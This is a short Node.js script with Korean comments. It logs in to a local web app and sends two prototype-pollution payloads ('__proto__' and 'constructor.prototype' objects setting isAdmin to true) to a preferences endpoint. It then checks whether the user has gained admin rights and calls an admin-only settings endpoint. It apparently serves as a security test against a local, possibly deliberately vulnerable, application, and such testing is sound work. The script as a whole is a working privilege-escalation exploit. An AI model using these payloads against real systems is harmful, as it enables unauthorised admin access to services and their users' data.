const axios = require('axios');

async function quickTest() {
  try {
    // 로그인
    const loginResponse = await axios.post('http://localhost:5000/api/users/login', {
      email: 'bitcoin@example.com',
      password: 'BitcoinMoon$'
    });
    
    const token = loginResponse.data.token;
    console.log('✅ 로그인 성공\n');
    
    // Prototype Pollution (여러 방법 시도)
    console.log('🔥 Prototype Pollution 시도...');
    
    await axios.post('http://localhost:5000/api/settings/preferences', {
      settings: {
        theme: 'dark',
        nested: { "__proto__": { "isAdmin": true } }
      }
    }, { headers: { Authorization: `Bearer ${token}` } });
    
    await axios.post('http://localhost:5000/api/settings/preferences', {
      settings: {
        constructor: { prototype: { isAdmin: true } }
      }
    }, { headers: { Authorization: `Bearer ${token}` } });
    
    // 즉시 /auth/me 확인
    const userResponse = await axios.get('http://localhost:5000/api/auth/me', {
      headers: { Authorization: `Bearer ${token}` }
    });
    
    console.log('사용자 정보:', userResponse.data.user);
    console.log('isAdmin 속성:', userResponse.data.user.isAdmin);
    
    // 관리자 기능 테스트
    try {
      const adminResponse = await axios.post('http://localhost:5000/api/settings/global-settings', {
        key: 'test',
        value: 'value'
      }, { headers: { Authorization: `Bearer ${token}` } });
      
      console.log('🚨 관리자 기능 성공!', adminResponse.data);
    } catch (err) {
      console.log('❌ 관리자 기능 실패:', err.response?.data?.message);
    }
    
  } catch (error) {
    console.error('오류:', error.response?.data || error.message);
  }
}

quickTest();
